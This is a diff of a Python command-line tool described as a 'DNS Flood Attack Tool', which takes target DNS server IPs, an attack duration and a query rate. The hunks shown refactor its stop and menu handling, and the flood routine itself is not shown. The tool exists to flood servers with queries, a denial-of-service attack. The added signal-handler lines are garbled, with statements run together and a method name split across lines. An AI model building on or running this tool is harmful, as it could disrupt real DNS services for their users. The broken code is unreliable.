@@ -110,29 +110,21 @@ def Start():
         DnsFlood()
     except KeyboardInterrupt:
         print("\nInterrupted by user!")
-    Stop()
-
-def Stop():
-    global dnsRunning, stopTimer, timerThread
-    dnsRunning = False
-    stopTimer = True
-    if timerThread is not None and timerThread.is_alive():
-        timerThread.join()
-    print(f"\n{RED}Stopping the attack...{RESET}")
 
 def SignalHandler(sig, frame):
-    
-    Stop()
+    global dnsRunning, stopTimer, timerThread             dnsRunning = False                                    stopTimer = True                                      if timerThread is not None and timerThread.is_aliv
+e():                                                          timerThread.join()
+    print(f"\n{RED}Stopping the attack...{RESET}")
     sys.exit(0)
 
-def Menu():
+def menu():
     global dnsServers, attackDuration, queryRate
     dnsServers = input(f"\n{RED}Enter the DNS server IP addresses (comma-separated): {RESET}").split(",")
     attackDuration = int(input(f"{RED}Enter the attack duration in seconds: {RESET}"))
     queryRate = int(input(f"{RED}Enter the query rate (it will be multiplied by 10): {RESET}"))
     Start()
 
-def Terminal():
+def terminal():
     parser = argparse.ArgumentParser(description="DNS Flood Attack Tool")
     parser.add_argument("-d", "--dns", type=str, required=True, help="Comma-separated list of DNS server IP addresses.")
     parser.add_argument("-t", "--duration", type=int, default=120, help="Attack duration in seconds (default: 120).")
@@ -147,9 +139,9 @@ def Terminal():
 def main():
     signal.signal(signal.SIGINT, SignalHandler)
     if len(sys.argv) > 1:
-        Terminal()
+        terminal()
     else:
-        Menu()
+        menu()
 
 if __name__ == "__main__":
     main()
